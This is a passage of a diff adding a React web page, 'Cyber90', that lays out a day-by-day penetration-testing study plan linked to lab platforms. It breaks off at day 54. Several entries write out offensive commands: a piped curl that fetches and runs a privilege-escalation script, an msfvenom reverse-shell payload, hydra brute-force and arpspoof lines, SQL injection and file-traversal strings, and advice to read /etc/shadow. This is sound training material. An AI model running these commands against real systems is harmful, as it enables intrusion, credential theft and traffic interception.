@@ -1,0 +1,750 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"/>
+  <meta name="theme-color" content="#08090f"/>
+  <meta name="mobile-web-app-capable" content="yes"/>
+  <meta name="apple-mobile-web-app-capable" content="yes"/>
+  <title>Cyber90</title>
+  <style>
+    *{margin:0;padding:0;box-sizing:border-box;}
+    body{background:#08090f;color:#e2e8f0;font-family:system-ui,sans-serif;}
+    #root{min-height:100vh;}
+  </style>
+</head>
+<body>
+  <div id="root"><div style="display:flex;align-items:center;justify-content:center;min-height:100vh;"><p style="color:#00ff9f;font-size:14px;font-weight:600">⚡ Loading Cyber90...</p></div></div>
+  <script src="https://unpkg.com/react@18.2.0/umd/react.production.min.js"></script>
+  <script src="https://unpkg.com/react-dom@18.2.0/umd/react-dom.production.min.js"></script>
+  <script src="https://unpkg.com/@babel/standalone@7.23.2/babel.min.js"></script>
+  <script type="text/babel" data-presets="react,env">
+const { useState, useEffect } = React;
+
+
+// ── DATA ─────────────────────────────────────────────────────────────────────
+const DAYS = [
+  { day:1, title:"OSI Model", topic:"OSI Model – all 7 layers, what happens at each", phase:1,
+    study:["The OSI model has 7 layers: Physical, Data Link, Network, Transport, Session, Presentation, Application","Each layer has a specific job — data travels down on the sender side and up on the receiver side","Key layers to memorize for hacking: Layer 3 (Network/IP), Layer 4 (Transport/TCP-UDP), Layer 7 (Application/HTTP)","Encapsulation: each layer wraps data with its own header as it goes down the stack","Real attacks target specific layers — e.g. ARP spoofing = Layer 2, SYN flood = Layer 4"],
+    resource:"TryHackMe: Pre-Security → Network Fundamentals", resourceUrl:"https://tryhackme.com/path/outline/presecurity" },
+  { day:2, title:"TCP/IP", topic:"TCP/IP deep dive – handshake, packets, headers", phase:1,
+    study:["TCP/IP is the real-world protocol suite — 4 layers vs OSI's 7","3-way handshake: SYN → SYN-ACK → ACK (this is how every TCP connection starts)","TCP is reliable (guaranteed delivery), UDP is fast but unreliable — know when each is used","Packet headers contain source/dest IP, TTL, flags (SYN, ACK, FIN, RST, PSH, URG)","Wireshark captures these packets — understanding headers is key for traffic analysis"],
+    resource:"YouTube: Professor Messer – TCP/IP", resourceUrl:"https://youtube.com" },
+  { day:3, title:"IP Addressing", topic:"IP addressing – IPv4, subnetting basics, CIDR", phase:1,
+    study:["IPv4 addresses are 32-bit numbers written as 4 octets (e.g. 192.168.1.1)","Private ranges: 10.x.x.x, 172.16-31.x.x, 192.168.x.x — these are not routable on the internet","CIDR notation: /24 means 255.255.255.0 subnet — 256 addresses, 254 usable","Subnetting lets you divide a network — critical for understanding target scope in pentests","Loopback: 127.0.0.1 always points to your own machine"],
+    resource:"TryHackMe: What is Networking?", resourceUrl:"https://tryhackme.com" },
+  { day:4, title:"Key Protocols", topic:"Key protocols – DNS, DHCP, ARP, ICMP", phase:1,
+    study:["DNS translates domain names to IPs — runs on port 53, uses UDP (and TCP for large responses)","DHCP automatically assigns IP, gateway, DNS to devices joining a network — port 67/68","ARP maps IP addresses to MAC addresses on a local network — no authentication = vulnerable to spoofing","ICMP is used for ping and network diagnostics — ICMP echo request/reply is how ping works","These protocols are all abusable: DNS poisoning, DHCP starvation, ARP spoofing are real attacks"],
+    resource:"YouTube: NetworkChuck – DNS explained", resourceUrl:"https://youtube.com/@networkchuck" },
+  { day:5, title:"HTTP/HTTPS", topic:"HTTP/HTTPS – request/response, status codes, headers", phase:1,
+    study:["HTTP is stateless — every request is independent, sessions managed via cookies","Request structure: Method (GET/POST/PUT/DELETE) + URL + Headers + Body","Key status codes: 200 OK, 301 Redirect, 403 Forbidden, 404 Not Found, 500 Server Error","HTTPS = HTTP + TLS encryption — traffic is encrypted but metadata (domain, timing) still visible","Important headers for hacking: Cookie, Authorization, Content-Type, X-Forwarded-For, User-Agent"],
+    resource:"PortSwigger Web Academy: HTTP intro", resourceUrl:"https://portswigger.net/web-security/learning-paths" },
+  { day:6, title:"Ports & Services", topic:"Ports & services – top 20 ports every hacker knows", phase:1,
+    study:["Must-know ports: 21 FTP, 22 SSH, 23 Telnet, 25 SMTP, 53 DNS, 80 HTTP, 443 HTTPS","More critical: 445 SMB, 3389 RDP, 3306 MySQL, 5432 PostgreSQL, 8080 HTTP-alt","Ports 0-1023 are 'well-known' ports — require root to bind on Linux","Nmap scans ports to find what services are running on a target machine","Open ports = attack surface — every open port is a potential entry point"],
+    resource:"Practice: nmap -sV scanme.nmap.org", resourceUrl:"https://nmap.org" },
+  { day:7, title:"Week 1 Review", topic:"Week 1 review – OSI, TCP/IP, protocols, ports", phase:1,
+    study:["Review OSI model layers from memory — can you name all 7 without looking?","Trace what happens when you type google.com — DNS → TCP handshake → HTTP request","Identify the protocol: file transfer=FTP, secure shell=SSH, web=HTTP/S, name resolution=DNS","Practice subnetting: what is the network address of 192.168.10.50/24?","Open Wireshark and capture traffic — identify TCP, DNS, HTTP packets by their structure"],
+    resource:"TryHackMe: Network room challenges", resourceUrl:"https://tryhackme.com" },
+  { day:8, title:"Linux Filesystem", topic:"Linux filesystem, navigation – ls, cd, pwd, find", phase:1,
+    study:["Linux filesystem starts at / (root) — everything is a file or directory","Key directories: /etc (config), /var (logs/data), /home (users), /tmp (temp, writable), /bin (binaries)","ls -la shows hidden files and permissions — always run this when exploring a target","find / -name '*.conf' 2>/dev/null searches for config files — useful for post-exploitation","pwd shows current location, cd .. goes up one level, cd - goes back to previous directory"],
+    resource:"TryHackMe: Linux Fundamentals Part 1", resourceUrl:"https://tryhackme.com/room/linuxfundamentalspart1" },
+  { day:9, title:"File Permissions", topic:"File permissions, users, groups – chmod, chown", phase:1,
+    study:["Permission format: rwxrwxrwx — owner, group, others. r=4, w=2, x=1","chmod 777 = full permissions for everyone. chmod 644 = common for files, 755 for directories","SUID bit (chmod +s) makes a file run as the file owner — huge privesc vector if set on root-owned binaries","Check for SUID files: find / -perm -4000 2>/dev/null — this is a standard privesc enumeration step","chown user:group file changes ownership — only root can give away ownership"],
+    resource:"TryHackMe: Linux Fundamentals Part 2", resourceUrl:"https://tryhackme.com/room/linuxfundamentalspart2" },
+  { day:10, title:"Processes & Services", topic:"Processes, services, cron – ps, kill, systemctl", phase:1,
+    study:["ps aux shows all running processes with user, PID, CPU, memory","kill PID sends SIGTERM, kill -9 PID force-kills — useful for stopping hanging processes","systemctl status/start/stop/enable controls services — check what's running on a target","Cron jobs run commands on a schedule — /etc/crontab and /etc/cron.d are key files to check","Writable cron scripts owned by root = instant privesc — always check cron during enumeration"],
+    resource:"TryHackMe: Linux Fundamentals Part 3", resourceUrl:"https://tryhackme.com/room/linuxfundamentalspart3" },
+  { day:11, title:"Bash Scripting", topic:"Bash scripting basics – variables, loops, conditionals", phase:1,
+    study:["Variables: name='ishuu' then echo $name — no spaces around the = sign","If statement: if [ condition ]; then ... fi — spaces inside brackets are required","For loop: for i in {1..10}; do echo $i; done — useful for automating repetitive tasks","Read user input: read -p 'Enter IP: ' ip — makes scripts interactive","Make executable: chmod +x script.sh then run with ./script.sh or bash script.sh"],
+    resource:"YouTube: NetworkChuck – Bash scripting", resourceUrl:"https://youtube.com/@networkchuck" },
+  { day:12, title:"Network Commands", topic:"Networking commands – ifconfig, ip, netstat, ss, curl", phase:1,
+    study:["ip a (or ifconfig) shows your network interfaces and IP addresses","netstat -tulpn or ss -tulpn shows open ports and listening services","curl -I URL fetches just headers — useful for fingerprinting web servers","ping and traceroute test connectivity and map network paths","wget downloads files from command line — useful for fetching tools/payloads onto a target"],
+    resource:"Kali Linux: practice these commands live", resourceUrl:"https://www.kali.org" },
+  { day:13, title:"Text Manipulation", topic:"Package management, text manipulation – grep, awk, sed", phase:1,
+    study:["grep 'pattern' file searches for text — grep -r for recursive, grep -i for case-insensitive","grep -v excludes matches — useful for filtering out noise from command output","awk '{print $1}' prints the first column — great for extracting IPs from nmap output","sed 's/old/new/g' replaces text in a stream — useful for modifying config files or payloads","cat file | grep password | awk '{print $2}' — chain commands to extract specific data"],
+    resource:"Practice on your Kali terminal", resourceUrl:"https://www.kali.org" },
+  { day:14, title:"Bash Port Scanner", topic:"Build a bash port scanner using ping + nc", phase:1,
+    study:["nc (netcat) -zv host port tests if a port is open — the swiss army knife of networking","for port in {1..1000}; do nc -zv -w1 $host $port 2>&1 | grep open; done — basic port scanner","ping sweep: for i in {1..254}; do ping -c1 192.168.1.$i | grep 'bytes from'; done","Redirect output: command 2>/dev/null sends errors to null — cleaner output","This exercise teaches you what Nmap does under the hood — understanding the basics matters"],
+    resource:"Build it yourself in Kali", resourceUrl:"https://www.kali.org" },
+  { day:15, title:"Kill Chain & ATT&CK", topic:"Cyber kill chain & MITRE ATT&CK framework overview", phase:1,
+    study:["Kill chain: Recon → Weaponize → Deliver → Exploit → Install → C2 → Actions on Objectives","Each kill chain stage maps to real attacker tools and techniques","MITRE ATT&CK is a matrix of Tactics (why) and Techniques (how) — used by defenders and pentesters","Tactics in ATT&CK: Initial Access, Execution, Persistence, PrivEsc, Defense Evasion, Collection, Exfil","As a pentester you will document your findings using ATT&CK technique IDs (e.g. T1059 = Command Execution)"],
+    resource:"MITRE ATT&CK website + TryHackMe: MITRE room", resourceUrl:"https://attack.mitre.org" },
+  { day:16, title:"Recon Types", topic:"Reconnaissance types – passive vs active recon", phase:1,
+    study:["Passive recon: gather info without touching the target — OSINT, DNS lookups, Google, Shodan","Active recon: directly interact with the target — ping, port scan, banner grabbing","Passive is stealthier but limited — active gives more data but leaves logs","WHOIS lookups reveal domain registration info — often contains names, emails, addresses","Certificate transparency logs (crt.sh) reveal all subdomains issued SSL certs — huge for recon"],
+    resource:"TryHackMe: Passive Reconnaissance", resourceUrl:"https://tryhackme.com/room/passiverecon" },
+  { day:17, title:"OSINT Basics", topic:"OSINT basics – Google dorking, Shodan, theHarvester", phase:1,
+    study:["Google dork: site:target.com filetype:pdf finds PDFs on a specific domain","intitle:'index of' finds directory listings — often exposes sensitive files","Shodan.io scans the entire internet for open ports/services — search by IP, hostname, or product","theHarvester collects emails, subdomains, IPs from public sources: theHarvester -d target.com -b all","Maltego provides visual link analysis for OSINT — maps relationships between entities"],
+    resource:"TryHackMe: Active Reconnaissance", resourceUrl:"https://tryhackme.com/room/activerecon" },
+  { day:18, title:"Nmap Scanning", topic:"Scanning with Nmap – flags, scan types, output formats", phase:1,
+    study:["nmap -sS (SYN scan) is stealthier than -sT (full connect) — requires root","nmap -sV detects service versions, -O detects OS, -A does aggressive scan (both + scripts)","nmap -p- scans all 65535 ports — slow but thorough. -p 80,443 scans specific ports","Output: -oN normal, -oX XML, -oG grepable, -oA saves all formats simultaneously","NSE scripts: nmap --script=vuln runs vulnerability detection scripts against open services"],
+    resource:"TryHackMe: Nmap room", resourceUrl:"https://tryhackme.com/room/furthernmap" },
+  { day:19, title:"Enumeration", topic:"Enumeration – what it means, why it's critical", phase:1,
+    study:["Enumeration = extracting detailed info from discovered services (users, shares, configs, versions)","Service enumeration: banner grabbing, version detection, running NSE scripts against ports","SMB enumeration: enum4linux -a target — gets users, shares, policies from Windows/Samba","SNMP enumeration: snmpwalk -c public -v1 target — often leaks huge amounts of system info","The more you enumerate, the more attack paths you find — never skip this phase"],
+    resource:"TryHackMe: Enumeration", resourceUrl:"https://tryhackme.com" },
+  { day:20, title:"Vuln Scanning", topic:"Vulnerability scanning basics – Nessus/OpenVAS concepts", phase:1,
+    study:["Vulnerability scanners automate the process of checking known CVEs against detected service versions","Nessus is the industry standard commercial scanner — OpenVAS/Greenbone is the free alternative","Scanners produce reports ranking findings by severity: Critical, High, Medium, Low, Informational","False positives are common — always manually verify scanner findings before reporting","CVSS score (0-10) rates vulnerability severity — 9.0+ is critical, needs immediate attention"],
+    resource:"TryHackMe: Vulnerabilities 101", resourceUrl:"https://tryhackme.com/room/vulnerabilities101" },
+  { day:21, title:"Recon Review", topic:"Full recon methodology review – passive to active", phase:1,
+    study:["Full recon workflow: WHOIS → DNS → Google dorks → Shodan → theHarvester → Nmap → Enum","Document everything as you go — create a target profile with IPs, ports, services, potential vulns","Subdomain enumeration: amass, subfinder, or gobuster dns mode","Technology fingerprinting: Wappalyzer browser extension, whatweb command line tool","A good recon phase often determines how successful the exploitation phase will be"],
+    resource:"TryHackMe: OHsint challenge", resourceUrl:"https://tryhackme.com/room/ohsint" },
+  { day:22, title:"Web App Basics", topic:"How web apps work – client/server, cookies, sessions", phase:1,
+    study:["Client makes HTTP request → server processes → sends back response (HTML/JSON/etc)","Cookies store session tokens — if you steal a cookie you can hijack someone's session","Sessions track logged-in state server-side — session ID is passed via cookie or URL parameter","Same-Origin Policy (SOP) prevents one site from reading another site's data in the browser","JWT (JSON Web Tokens) are stateless auth tokens — base64 encoded, check for 'none' algorithm flaw"],
+    resource:"PortSwigger: Web Security Academy intro", resourceUrl:"https://portswigger.net/web-security" },
+  { day:23, title:"Burp Suite", topic:"Burp Suite setup – intercept, repeater, decoder", phase:1,
+    study:["Burp Suite is the #1 tool for web app pentesting — set it up as a browser proxy on port 8080","Intercept: captures HTTP requests in real-time so you can modify them before they're sent","Repeater: resend and modify any captured request — great for testing different payloads","Decoder: encodes/decodes Base64, URL, HTML, hex — useful for manipulating obfuscated data","Target → Scope: set your target domain so Burp only captures relevant traffic"],
+    resource:"TryHackMe: Burp Suite Basics", resourceUrl:"https://tryhackme.com/room/burpsuitebasics" },
+  { day:24, title:"OWASP Top 10", topic:"OWASP Top 10 – all 10 categories", phase:1,
+    study:["A01 Broken Access Control — most common; users accessing data/functions they shouldn't","A02 Cryptographic Failures — weak encryption, plaintext passwords, HTTP instead of HTTPS","A03 Injection — SQLi, command injection, LDAP injection — unsanitized input being executed","A05 Security Misconfiguration — default creds, open admin panels, verbose error messages","A10 Server-Side Request Forgery (SSRF) — server fetches attacker-controlled URLs, hits internal services"],
+    resource:"TryHackMe: OWASP Top 10 room", resourceUrl:"https://tryhackme.com/room/owasptop102021" },
+  { day:25, title:"SQL Injection", topic:"SQL Injection – how it works, manual testing", phase:1,
+    study:["SQLi occurs when user input is inserted directly into SQL queries without sanitization","Basic test: add ' or \" to input fields and look for database errors in the response","Login bypass: ' OR '1'='1 in username field — always true condition","UNION attack: ' UNION SELECT null,null,null-- — extract data from other tables","sqlmap -u 'URL?id=1' --dbs — automated SQLi tool, but learn manual first"],
+    resource:"PortSwigger: SQL injection labs", resourceUrl:"https://portswigger.net/web-security/sql-injection" },
+  { day:26, title:"XSS", topic:"XSS – reflected, stored, DOM based", phase:1,
+    study:["Reflected XSS: malicious script in URL parameter, reflected back in response immediately","Stored XSS: payload saved in database, executes for every user who views the page — more dangerous","DOM XSS: JavaScript reads from URL/DOM and inserts unsanitized data into the page","Basic payload: [script]alert(1)[/script] — test if it executes, then escalate","Cookie theft: Use payload: location redirect to capture cookie value"],
+    resource:"PortSwigger: XSS labs", resourceUrl:"https://portswigger.net/web-security/cross-site-scripting" },
+  { day:27, title:"File Inclusion", topic:"Directory traversal & file inclusion basics", phase:1,
+    study:["Directory traversal: ../../../../etc/passwd in file parameters to read files outside webroot","LFI (Local File Inclusion): include local files — can read /etc/passwd, SSH keys, config files","RFI (Remote File Inclusion): include a remote URL — can execute your own PHP shell","Null byte bypass (older PHP): file.php%00 — truncates extension to bypass filters","Log poisoning: inject PHP into Apache logs then include the log file via LFI to get RCE"],
+    resource:"TryHackMe: File Inclusion room", resourceUrl:"https://tryhackme.com/room/fileinc" },
+  { day:28, title:"Auth Flaws", topic:"Authentication flaws – broken auth, IDOR concepts", phase:1,
+    study:["Broken auth: weak passwords, no lockout, predictable session tokens, insecure 'remember me'","IDOR (Insecure Direct Object Reference): change id=5 to id=6 to access another user's data","Test every numeric/user-specific parameter for IDOR — it's the most common bug in bug bounty","Password reset flaws: predictable tokens, host header injection, token reuse, no expiry","Multi-factor bypass: check if MFA can be skipped by navigating directly to post-login URLs"],
+    resource:"PortSwigger: Authentication labs", resourceUrl:"https://portswigger.net/web-security/authentication" },
+  { day:29, title:"Web Enumeration", topic:"Nikto, gobuster, ffuf – web enumeration tools", phase:1,
+    study:["gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt — directory bruteforce","ffuf -u http://target/FUZZ -w wordlist.txt — faster and more flexible than gobuster","Nikto -h target — automated web server scanner, checks for misconfigs and known vulns","Wordlists: /usr/share/wordlists/dirb/ and SecLists (GitHub) are your best resources","Always enumerate: /admin, /backup, /.git, /config, /api — these are common juicy paths"],
+    resource:"TryHackMe: Web Fundamentals path", resourceUrl:"https://tryhackme.com" },
+  { day:30, title:"Phase 1 Review", topic:"Phase 1 review – networking, Linux, recon, web basics", phase:1,
+    study:["Test yourself: from memory, explain TCP handshake, OSI layers, and subnetting","Can you run a full recon on a domain? WHOIS → Nmap → enumeration → web scanning","Linux: SUID files, cron jobs, interesting /etc files — do you know why each matters?","Web: can you manually test for SQLi, XSS, IDOR in Burp Suite without a guide?","If weak on any area, go back and redo that day's resources before Phase 2"],
+    resource:"Write your notes into a personal cheat sheet", resourceUrl:"https://github.com" },
+  { day:31, title:"Metasploit Basics", topic:"Metasploit architecture – modules, payloads, listeners", phase:2,
+    study:["Metasploit Framework (MSF) is the most used exploitation platform in pentesting","Module types: exploits (attack code), payloads (what runs after exploit), auxiliary (scanners/fuzzers)","msfconsole is the main interface — type help to see all commands","Payloads: singles (self-contained), stagers (download second stage), meterpreter (powerful shell)","Listeners: use exploit/multi/handler with matching payload to catch reverse shells"],
+    resource:"TryHackMe: Metasploit Introduction", resourceUrl:"https://tryhackme.com/room/metasploitintro" },
+  { day:32, title:"Msfconsole", topic:"Msfconsole workflow – search, use, set, run", phase:2,
+    study:["search ms17-010 — finds all modules related to a keyword","use exploit/windows/smb/ms17_010_eternalblue — selects a module","show options — displays required and optional settings for the module","set RHOSTS 10.10.10.10 / set LHOST 10.9.0.1 / set LPORT 4444 — configure the exploit","run or exploit — executes. Use check first if available to test without exploiting"],
+    resource:"TryHackMe: Metasploit Exploitation", resourceUrl:"https://tryhackme.com/room/metasploitexploitation" },
+  { day:33, title:"Payloads", topic:"Payloads – staged vs stageless, meterpreter basics", phase:2,
+    study:["Staged: windows/x64/meterpreter/reverse_tcp — small stager downloads full payload (/ separator)","Stageless: windows/x64/meterpreter_reverse_tcp — entire payload in one file (_ separator)","Meterpreter runs in memory — stealthy, no file written to disk by default","Key meterpreter commands: sysinfo, getuid, getsystem, hashdump, shell, upload, download","msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe > shell.exe"],
+    resource:"TryHackMe: Metasploit Meterpreter", resourceUrl:"https://tryhackme.com/room/meterpreter" },
+  { day:34, title:"Machine Exploitation", topic:"Exploiting a vulnerable machine end-to-end", phase:2,
+    study:["Full workflow: scan → identify service+version → search CVE → find MSF module → configure → exploit","EternalBlue (MS17-010) exploits SMBv1 on Windows 7/2008 — one of the most famous exploits ever","After exploitation: run getsystem for SYSTEM privileges, then hashdump to get password hashes","Always document: what port, what exploit, what CVE, what access level you achieved","Practice on TryHackMe Blue — it walks you through the entire EternalBlue attack chain"],
+    resource:"TryHackMe: Blue (EternalBlue/MS17-010)", resourceUrl:"https://tryhackme.com/room/blue" },
+  { day:35, title:"Manual Exploitation", topic:"Manual exploitation – what MSF does under the hood", phase:2,
+    study:["Exploit-DB (exploit-db.com) has public exploits for known CVEs — learn to use raw scripts","searchsploit <service> searches the local copy of Exploit-DB from command line","Python/Ruby exploit scripts: read the code, understand what it does before running it","Manually sending exploit: modify the script's IP/port, check if dependencies are installed","MSF modules are just well-packaged versions of what you could do manually — understanding both is key"],
+    resource:"YouTube: IppSec – manual exploit walkthrough", resourceUrl:"https://youtube.com/@ippsec" },
+  { day:36, title:"Post Exploitation", topic:"Post exploitation – hashdump, sysinfo, pivot basics", phase:2,
+    study:["Post exploitation: what you do after getting a shell — elevate, persist, pivot, collect","hashdump extracts Windows NTLM password hashes — crack offline with hashcat or pass-the-hash","sysinfo shows OS, hostname, architecture — important for choosing further tools/exploits","run post/multi/recon/local_exploit_suggester — finds local privesc exploits automatically","Pivoting: route add subnet netmask session_id in MSF — tunnel attacks through compromised host"],
+    resource:"TryHackMe: Post Exploitation Basics", resourceUrl:"https://tryhackme.com/room/postexploit" },
+  { day:37, title:"Full Attack Chain", topic:"Full chain practice – scan to exploit to post exploitation", phase:2,
+    study:["Step 1 Recon: nmap -sC -sV -oA scan target — enumerate all services","Step 2 Research: look up versions found, search for known exploits and CVEs","Step 3 Exploit: use MSF or manual exploit to gain initial access","Step 4 Post-exploit: enumerate locally, escalate privileges, dump credentials","Step 5 Document: write up every step, command used, output received — practice for real reports"],
+    resource:"TryHackMe: Easy machine of your choice", resourceUrl:"https://tryhackme.com" },
+  { day:38, title:"Password Cracking Theory", topic:"Password cracking theory – hashes, salts, rainbow tables", phase:2,
+    study:["Hashes are one-way — MD5, SHA1, SHA256, NTLM, bcrypt. You can't reverse, only crack","Cracking methods: dictionary attack (wordlist), brute force (all combos), rule-based (mutations)","Salts are random values added before hashing — defeat rainbow table attacks","Rainbow tables: precomputed hash→password mappings — fast but defeated by salts","Hash identification: hash-identifier or haiti tool tells you the hash type to know which mode to use"],
+    resource:"TryHackMe: Hashing – Crypto 101", resourceUrl:"https://tryhackme.com/room/hashingcrypto101" },
+  { day:39, title:"Hashcat & John", topic:"Hashcat & John the Ripper – wordlists, rules, modes", phase:2,
+    study:["hashcat -m 0 hash.txt rockyou.txt — crack MD5 with rockyou wordlist (-m 0 = MD5 mode)","hashcat -m 1000 = NTLM, -m 1800 = sha512crypt, -m 3200 = bcrypt","john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt — John the Ripper basic usage","Rules amplify wordlists: hashcat -r rules/best64.rule — adds numbers, symbols, case changes","rockyou.txt (/usr/share/wordlists/) is the standard starting wordlist — 14 million passwords"],
+    resource:"TryHackMe: John the Ripper room", resourceUrl:"https://tryhackme.com/room/johntheripper0" },
+  { day:40, title:"Hydra Brute Force", topic:"Hydra – brute force login forms, SSH, FTP", phase:2,
+    study:["hydra -l admin -P rockyou.txt ssh://target — brute force SSH with known username","hydra -L users.txt -P passwords.txt ftp://target — try multiple usernames and passwords","HTTP form: hydra target http-post-form '/login:user=^USER^&pass=^PASS^:Invalid password'","Always check: rate limiting, lockout policies, CAPTCHA before running hydra on real targets","Medusa is an alternative to Hydra — faster for some protocols"],
+    resource:"TryHackMe: Hydra room", resourceUrl:"https://tryhackme.com/room/hydra" },
+  { day:41, title:"Linux PrivEsc", topic:"Linux privesc – SUID, sudo misconfig, cron jobs", phase:2,
+    study:["sudo -l lists what commands the current user can run as sudo — first thing to check","SUID binaries: find / -perm -4000 2>/dev/null — check GTFOBins for exploitation methods","Cron jobs: cat /etc/crontab — if a script runs as root and you can write to it = instant root","Writable /etc/passwd: you can add a new root user directly to the file","GTFOBins.github.io — essential resource listing how to abuse binaries for privesc"],
+    resource:"TryHackMe: Linux PrivEsc room", resourceUrl:"https://tryhackme.com/room/linuxprivescarena" },
+  { day:42, title:"Windows PrivEsc", topic:"Windows privesc – token impersonation, unquoted paths", phase:2,
+    study:["whoami /priv — check your current privileges. SeImpersonatePrivilege = use Potato exploits","Unquoted service paths: if path has spaces and no quotes, Windows may execute your binary instead","AlwaysInstallElevated: if set, MSI files run as SYSTEM — create malicious MSI with msfvenom","Token impersonation: Potato exploits (PrintSpoofer, JuicyPotato) abuse Windows tokens for SYSTEM","PowerUp.ps1 and WinPEAS.exe — run these for automated Windows privesc enumeration"],
+    resource:"TryHackMe: Windows PrivEsc room", resourceUrl:"https://tryhackme.com/room/windows10privesc" },
+  { day:43, title:"PrivEsc Scripts", topic:"Privesc enumeration scripts – LinPEAS, WinPEAS", phase:2,
+    study:["LinPEAS: curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh","LinPEAS color codes: red/yellow = high priority findings to investigate first","WinPEAS.exe on Windows — run from meterpreter or cmd, output everything to a file for review","linux-exploit-suggester.sh suggests kernel exploits based on OS version","Don't just run scripts — read the output and understand what each finding means"],
+    resource:"TryHackMe: Common Linux Privesc", resourceUrl:"https://tryhackme.com/room/commonlinuxprivesc" },
+  { day:44, title:"PrivEsc Practice", topic:"Full privesc chain – enumerate to root", phase:2,
+    study:["Standard privesc methodology: whoami → sudo -l → SUID → cron → writable files → services","Always check /home directories for other users' files, SSH keys, bash history","/var/www, /opt, /srv — web app directories often contain database credentials in config files","Kernel exploits are a last resort — noisy and can crash the system. Try other methods first","After rooting: read /etc/shadow for future password cracking practice"],
+    resource:"TryHackMe: Kenobi", resourceUrl:"https://tryhackme.com/room/kenobi" },
+  { day:45, title:"ARP & MITM", topic:"ARP spoofing & MITM attacks – theory + Ettercap", phase:2,
+    study:["ARP has no authentication — anyone can send fake ARP replies poisoning the cache","ARP spoofing: tell victim 'gateway MAC = my MAC' and tell gateway 'victim MAC = my MAC'","You become the man-in-the-middle — all traffic flows through your machine","arpspoof -i eth0 -t victim gateway / arpspoof -i eth0 -t gateway victim — two-way spoof","Ettercap provides GUI for MITM + can inject content into HTTP traffic in real time"],
+    resource:"TryHackMe: ARP Spoofing room", resourceUrl:"https://tryhackme.com" },
+  { day:46, title:"Wireshark", topic:"Wireshark deep dive – filter syntax, capture analysis", phase:2,
+    study:["Display filters: ip.addr==10.0.0.1, tcp.port==80, http, dns — narrow down traffic","Follow Stream: right-click a packet → Follow → TCP Stream — see full conversation in cleartext","http.request.method=='POST' finds form submissions — often contains credentials","Statistics → Protocol Hierarchy — see breakdown of all protocols in the capture","Export objects: File → Export Objects → HTTP — extracts files transferred over HTTP"],
+    resource:"TryHackMe: Wireshark 101", resourceUrl:"https://tryhackme.com/room/wireshark" },
+  { day:47, title:"SMB Enumeration", topic:"SMB enumeration – smbclient, enum4linux, crackmapexec", phase:2,
+    study:["SMB runs on port 445 — used for Windows file sharing, one of the most attacked services","smbclient -L //target -N — list shares anonymously. Connect: smbclient //target/share -N","enum4linux -a target — dumps users, groups, shares, policies from SMB/RPC","crackmapexec smb target -u user -p pass — check credentials across multiple hosts","Null session: some older configs allow unauthenticated SMB access — always test this first"],
+    resource:"TryHackMe: Network Services room", resourceUrl:"https://tryhackme.com/room/networkservices" },
+  { day:48, title:"FTP SSH Telnet", topic:"FTP, Telnet, SSH attacks – misconfigs, weak creds", phase:2,
+    study:["FTP anonymous login: ftp target then user 'anonymous' pass '' — very common misconfiguration","Telnet sends all data in cleartext including passwords — capture with Wireshark","SSH: try default creds, check for weak key algorithms, look for private keys left on systems","SSH private keys: if you find id_rsa set chmod 600 id_rsa then ssh -i id_rsa user@target","Banner grabbing: nc target port or telnet target port — reveals service version info"],
+    resource:"TryHackMe: Network Services 2", resourceUrl:"https://tryhackme.com/room/networkservices2" },
+  { day:49, title:"Tunneling", topic:"VPN & tunneling – port forwarding, proxychains", phase:2,
+    study:["Port forwarding: ssh -L localport:target:remoteport user@pivot — access internal services","Dynamic forwarding: ssh -D 9050 user@pivot + proxychains — route all tools through SSH tunnel","proxychains nmap -sT target — run nmap through a SOCKS proxy (note: SYN scan won't work)","Chisel: fast HTTP-based tunnel — useful when SSH isn't available for pivoting","MSF: route add 192.168.2.0/24 session_id — route MSF traffic through a meterpreter session"],
+    resource:"TryHackMe: Tunneling room", resourceUrl:"https://tryhackme.com" },
+  { day:50, title:"Firewall Evasion", topic:"Firewall evasion – nmap techniques, fragmentation", phase:2,
+    study:["nmap -f fragments packets — some firewalls can't reassemble and let them through","nmap -D RND:10 — decoy scan, hides your IP among random decoys in firewall logs","nmap --source-port 53 — spoof source port as DNS, some firewalls allow DNS traffic","nmap -sA (ACK scan) maps firewall rules — determines which ports are filtered vs unfiltered","--scan-delay 1s and --max-rate 10 — slow the scan to evade IDS/IPS rate-based detection"],
+    resource:"TryHackMe: Nmap Advanced", resourceUrl:"https://tryhackme.com" },
+  { day:51, title:"Network Pentest", topic:"Full network pentest workflow on a lab", phase:2,
+    study:["Full network methodology: host discovery → port scan → service enum → exploit → post","Scope: always know what IPs/ranges are in scope before you start touching anything","Host discovery: nmap -sn 10.10.10.0/24 or netdiscover -r 192.168.1.0/24","After getting access: check network interfaces on compromised box — is there another subnet?","Practice pivoting: compromise host A, use it to attack host B on the internal network"],
+    resource:"TryHackMe: Throwback network", resourceUrl:"https://tryhackme.com" },
+  { day:52, title:"Advanced SQLi", topic:"Advanced SQLi – UNION attacks, blind SQLi, sqlmap", phase:2,
+    study:["UNION attack: determine column count first with ORDER BY then UNION SELECT null,null,null--","Find string column: replace nulls with 'a' one at a time to find which column reflects in response","Blind SQLi: no output — use boolean (AND 1=1) or time-based (AND SLEEP(5)) techniques","sqlmap -u 'URL?id=1' --dbs lists databases. --tables -D dbname lists tables. --dump extracts data","Always try manual SQLi first — understand what sqlmap does before relying on automation"],
+    resource:"PortSwigger: SQLi labs intermediate", resourceUrl:"https://portswigger.net/web-security/sql-injection" },
+  { day:53, title:"Advanced XSS", topic:"Advanced XSS – CSP bypass, stealing cookies", phase:2,
+    study:["CSP (Content Security Policy) restricts script sources — check response headers for CSP","CSP bypass via JSONP: if script-src allows a CDN with JSONP endpoint, abuse it","Cookie theft payload: ","XSS to session hijack: steal cookie, set in browser, reload page — you're now logged in as victim","DOM XSS sources: location.hash, location.search, document.referrer — check JS code for these"],
+    resource:"PortSwigger: XSS labs intermediate", resourceUrl:"https://portswigger.net/web-security/cross-site-scripting" },
+  { day:54, title:"SSRF", topic:"SSRF – how it works, cloud metadata exploitation", phase:2,
